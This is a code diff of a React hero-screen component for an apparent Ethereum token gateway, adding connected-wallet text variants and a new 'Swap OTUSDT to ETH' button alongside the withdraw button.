@@ -1,30 +1,42 @@
-import { Wallet, Lock, Zap, Eye } from "./Icons";
+import { Wallet, Lock, Zap, Eye, Repeat, ArrowUpRight } from "./Icons";
 
-export default function HeroScreen({ onConnect }) {
+export default function HeroScreen({ onConnect, onSwapStart, isConnected }) {
   return (
     <div className="otg-screen">
       <div className="otg-wrap">
         <div className="otg-hero">
           <p className="otg-tagline">Ethereum Gateway Protocol</p>
           <h1>
-            Withdraw Your
+            {isConnected ? "Choose Your" : "Withdraw Your"}
             <br />
-            <span className="otg-brand">OTUSDT</span> Securely
+            <span className="otg-brand">OTUSDT</span>{" "}
+            {isConnected ? "Action" : "Securely"}
           </h1>
           <p className="otg-hero-sub">
-            Connect your wallet to move your OTUSDT to any wallet or exchange
-            through the official gateway.
+            {isConnected
+              ? "Withdraw your OTUSDT to any wallet, or swap it instantly to ETH in your connected wallet."
+              : "Connect your wallet to move your OTUSDT to any wallet or exchange through the official gateway."}
           </p>
           <button
             className="otg-hero-btn"
             onClick={onConnect}
-            aria-label="Connect your cryptocurrency wallet to begin withdrawal"
+            aria-label={isConnected ? "Withdraw OTUSDT" : "Connect your cryptocurrency wallet to begin withdrawal"}
           >
-            <Wallet size={18} />
-            Connect Wallet
+            {isConnected ? <ArrowUpRight size={18} /> : <Wallet size={18} />}
+            {isConnected ? "Withdraw OTUSDT" : "Connect Wallet"}
+          </button>
+          <button
+            className="otg-hero-btn-swap"
+            onClick={onSwapStart}
+            aria-label="Swap OTUSDT for ETH"
+          >
+            <Repeat size={16} />
+            Swap OTUSDT to ETH
           </button>
           <p className="otg-hero-supported">
-            MetaMask · Trust Wallet · Coinbase · Phantom + 300 wallets
+            {isConnected
+              ? "Wallet connected. Pick a flow to continue."
+              : "MetaMask · Trust Wallet · Coinbase · Phantom + 300 wallets"}
           </p>
 
           <div className="otg-trust" role="list" aria-label="Platform features">
